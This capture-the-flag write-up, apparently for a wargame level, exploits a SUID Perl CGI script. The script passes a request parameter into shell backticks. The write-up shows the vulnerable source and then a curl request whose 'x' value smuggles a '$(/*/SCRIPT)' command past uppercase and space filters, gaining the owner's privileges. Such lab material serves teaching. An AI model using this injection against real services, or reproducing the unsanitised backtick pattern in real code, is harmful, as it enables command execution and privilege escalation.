Start by listing the files in the current directory:
```bash
ls -la
```
Output:
```bash
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

We notice the `level12.pl` file is a Perl script with the SUID bit set and owned by `flag12`, which means we can potentially run it to gain `flag12`'s privileges.

Reading the source code:
```bash
cat level12.pl
```
Output:
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
The script is a CGI application running on `localhost:4646`. It does the following:
- Takes two parameters `x` and `y`.
- Transforms `x` to uppercase and strips everything after the first space.
- Greps `x` from `/tmp/xd`, and for each match, if the second part (after the colon) matches `y`, prints `..`.

This implies we can try command injection by injecting something in the `x` parameter that gets evaluated inside backticks.

However, because `x` is uppercased and trimmed after a space, we must bypass these filters.

We create a file with a shell command:
```bash
echo 'getflag > /tmp/flag12' > /tmp/SCRIPT
chmod +x /tmp/SCRIPT
```

We then execute the Perl script through curl using a path that won’t be altered by the uppercase and space removal:
```bash
curl 'localhost:4646?x=$(/*/SCRIPT)&y=whatever'
```

- `$(/*/SCRIPT)` expands to `/tmp/SCRIPT` since `/tmp` matches `/*/`.
- The command gets evaluated by the backticks in the script.
- `getflag` is executed with `flag12` privileges and the output goes to `/tmp/flag12`.

We can now read the flag:
```bash
cat /tmp/flag12
```

And we get the next flag.

